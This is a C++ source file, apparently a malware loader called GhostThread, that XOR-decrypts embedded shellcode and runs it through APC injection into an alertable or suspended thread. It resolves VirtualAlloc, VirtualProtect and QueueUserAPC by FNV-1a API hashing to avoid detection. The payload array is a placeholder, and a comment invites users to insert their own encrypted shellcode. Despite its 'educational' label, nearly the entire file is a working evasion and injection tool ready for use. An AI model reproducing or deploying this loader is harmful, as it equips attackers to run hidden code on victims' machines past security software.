/*
 * Author: Cyb3rV1c
 * Created: October 2024
 * License: MIT License
 * This code was written by Cyb3rV1c and is a work in progress for cybersecurity
 * educational purposes.
 */

#include <Windows.h>
#include <stdio.h>
#include <iostream>
 // if the following is defined, the code will run apc injection using a alertable sacrificial thread,
 // else if it is commented, the program will create the sacrificial thread in a suspended state, to resume it later (and run the payload)

#define RUN_BY_ALERTABLETHREAD

 // Define the XOR key
const unsigned char xorKey = 0xAB; // Example key for XOR decryption

// Define FNV-1a hashing function for API hashing
unsigned int hash_api(const char* str) {
    unsigned int hash = 2166136261U;  // FNV offset basis
    while (*str) {
        hash ^= (unsigned int)(*str++);
        hash *= 16777619;  // FNV prime
    }
    return hash;
}

// XOR decryption function
void xor_decrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

// Dynamically resolve API functions via hash from export table
FARPROC resolve_function_by_hash(HMODULE hModule, unsigned int apiHash) {
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* nameRVA = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
    DWORD* functionRVA = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);

    for (unsigned int i = 0; i < exportDirectory->NumberOfNames; i++) {
        const char* functionName = (const char*)((BYTE*)hModule + nameRVA[i]);
        if (hash_api(functionName) == apiHash) {
            return (FARPROC)((BYTE*)hModule + functionRVA[ordinals[i]]);
        }
    }
    return nullptr;  // API not found
}

// Precomputed FNV-1a hashes for the required APIs
#define VIRTUALALLOC_HASH 0x3285501 // VirtualAlloc
#define VIRTUALPROTECT_HASH 0x820621F3 // VirtualProtect
#define QUEUEUSERAPC_HASH 0x890BB4FB  // QueueUserAPC

// Add your Encrypted shellcode here
unsigned char Payload[] = {
0x32, 0x32 //Example 
};



// If RUN_BY_ALERTABLETHREAD is not defined, then use a suspended thread for APC injection else if defined run using a alertable sacrificial thread
#ifndef RUN_BY_ALERTABLETHREAD
DWORD WINAPI DummyFunction(LPVOID lpParam) {
    int j = rand();
    int i = j + rand();
    return 0; // Must return a DWORD value.
}
#endif

#ifdef RUN_BY_ALERTABLETHREAD
DWORD WINAPI AlertableFunction5(LPVOID lpParam) {
    HANDLE hEvent1 = CreateEvent(NULL, FALSE, FALSE, NULL);
    HANDLE hEvent2 = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (hEvent1 && hEvent2) {
        SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
        CloseHandle(hEvent1);
        CloseHandle(hEvent2);
    }
    return 0; // Return a DWORD value.
}
#endif

//Apcinjection function

BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");

    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef DWORD(WINAPI* QueueUserAPC_t)(PAPCFUNC, HANDLE, ULONG_PTR);

    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)resolve_function_by_hash(kernel32, VIRTUALALLOC_HASH);
    VirtualProtect_t pVirtualProtect = (VirtualProtect_t)resolve_function_by_hash(kernel32, VIRTUALPROTECT_HASH);
    QueueUserAPC_t pQueueUserAPC = (QueueUserAPC_t)resolve_function_by_hash(kernel32, QUEUEUSERAPC_HASH);

    if (!pVirtualAlloc || !pVirtualProtect || !pQueueUserAPC) {
        printf("[!] Failed to resolve required API functions.\n");
        return FALSE;
    }

    PVOID pAddress = pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("\t[!] VirtualAlloc Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    // Decrypt the payload
    xor_decrypt(pPayload, sPayloadSize, xorKey);
    memcpy(pAddress, pPayload, sPayloadSize);
    printf("\t[i] Decrypted Payload Written To: 0x%p \n", pAddress);

    DWORD dwOldProtection = 0;
    if (!pVirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\t[!] VirtualProtect Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    printf("\t[#] Press <Enter> To Run");
    getchar();

    // Inject via APC
    if (!pQueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        printf("\t[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

//Main exec function

int main() {
    using namespace std;
    cout << R"(
   _____ _               _ _______ _                        _ 
  / ____| |             | |__   __| |                      | |  .-.
 | |  __| |__   ___  ___| |_ | |  | |__  _ __ ___  __ _  __| | (o o) boo!
 | | |_ | '_ \ / _ \/ __| __|| |  | '_ \| '__/ _ \/ _` |/ _` | | O \
 | |__| | | | | (_) \__ \ |_ | |  | | | | | |  __/ (_| | (_| |  \   \
  \_____|_| |_|\___/|___/\__||_|  |_| |_|_|  \___|\__,_|\__,_|   `~~~'
)";
    HANDLE hThread = NULL;
    DWORD dwThreadId = NULL;
#ifndef RUN_BY_ALERTABLETHREAD
    hThread = CreateThread(NULL, NULL, &DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
        return FALSE;
    }
    printf("[+] Suspended Target Thread Created With Id: %d \n", dwThreadId);
#endif

#ifdef RUN_BY_ALERTABLETHREAD
    hThread = CreateThread(NULL, NULL, &AlertableFunction5, NULL, NULL, &dwThreadId);
    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
        return FALSE;
    }
    printf("\n[+] Alertable Target Thread Created With Id: %d \n", dwThreadId);
#endif

    printf("[i] Running Apc Injection Function ... \n");
    if (!RunViaApcInjection(hThread, Payload, sizeof(Payload))) {
        return -1;
    }
    printf("[+] DONE \n");

#ifndef RUN_BY_ALERTABLETHREAD
    printf("[i] Resuming Thread ...");
    ResumeThread(hThread);
    printf("[+] DONE \n");
#endif

    WaitForSingleObject(hThread, INFINITE);
    printf("[#] Press <Enter> To Quit");
    getchar();

    return 0;
}
